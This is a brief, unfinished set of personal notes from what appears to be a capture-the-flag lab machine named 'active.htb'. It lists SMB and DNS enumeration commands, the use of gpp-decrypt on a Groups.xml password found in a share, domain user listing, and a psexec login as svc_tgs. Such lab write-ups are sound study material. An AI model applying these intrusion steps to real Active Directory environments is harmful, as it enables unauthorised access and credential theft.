
- Nmap
![[Pasted image 20250914160453.png]]- DNS
	
	dnsrecon 
	nslookup

- SMB
	- smbclient -L $ip
	- smbmap -H $ip
- Enum4linux


a Replication Share is found
Listing the file we found some intersting files like group.xml 

- used gpp-decrypt to decryt the hash found in the file

- getADUsers.py -all  -dc-ip $ip 
- `active.htb/svc_tgs`
- psexec.py active.htb/svc_tgs@$ip
- 